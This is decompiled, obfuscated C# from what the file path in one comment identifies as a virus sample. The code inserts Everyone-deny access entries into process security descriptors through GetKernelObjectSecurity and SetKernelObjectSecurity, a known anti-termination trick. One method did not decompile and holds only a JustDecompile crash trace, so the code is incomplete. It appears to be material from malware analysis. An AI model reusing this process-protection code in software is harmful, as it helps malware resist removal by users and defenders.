using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

internal class ______________________________________________________________________________
{
	public ______________________________________________________________________________()
	{
	}

	public static void ____()
	{
		try
		{
			IntPtr currentProcess = ______________________________________________________________________________.GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ______________________________________________________________________________.______(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
			rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(4096), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
			______________________________________________________________________________._______(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(int int_0)
	{
		try
		{
			IntPtr handle = Process.GetProcessById(int_0).Handle;
			RawSecurityDescriptor rawSecurityDescriptor = ______________________________________________________________________________.______(handle);
			switch (sizeof(ulong))
			{
				default:
				{
					rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
					rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(4096), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
					______________________________________________________________________________._______(handle, rawSecurityDescriptor);
					break;
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static RawSecurityDescriptor ______(IntPtr intptr_0)
	{
		RawSecurityDescriptor rawSecurityDescriptor = null;
		try
		{
			byte[] numArray = new byte[0];
			uint num = 0;
			______________________________________________________________________________.GetKernelObjectSecurity(intptr_0, 4, numArray, 0, ref num);
			int ______ = <Module>.__________;
			if ((1 & (3395 + ______ ^ ______ + -7957)) != 0)
			{
				switch (((num * 32768 ^ 5363) == 0 ? sizeof(ushort) + 1938339977 : sizeof(int) + 1747541202))
				{

				}
			}
			if ((ulong)num < 0L || (ulong)num > 32767L)
			{
				throw new Win32Exception();
			}
			if (!______________________________________________________________________________.GetKernelObjectSecurity(intptr_0, 4, ______________________________________________________________________________.________<byte[]>(ref numArray, new byte[(int)((ulong)num - 1L) + 1]), num, ref num))
			{
				throw new Win32Exception();
			}
			rawSecurityDescriptor = new RawSecurityDescriptor(numArray, 0);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return rawSecurityDescriptor;
	}

	public static void _______(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		// 
		// Current member / type: System.Void ______________________________________________________________________________::_______(System.IntPtr,System.Security.AccessControl.RawSecurityDescriptor)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _______(System.IntPtr,System.Security.AccessControl.RawSecurityDescriptor)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	private static _ ________<_>(ref _ gparam_0, _ gparam_1)
	{
		gparam_0 = gparam_1;
		return gparam_1;
	}

	[DllImport("kernel32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	public static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", CharSet=CharSet.None, ExactSpelling=false, SetLastError=true)]
	private static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, ref uint uint_1);

	[DllImport("advapi32.dll", CharSet=CharSet.None, ExactSpelling=false, SetLastError=true)]
	private static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	[Flags]
	public enum _______________________________________________________________________________
	{
		_ = 987135
	}
}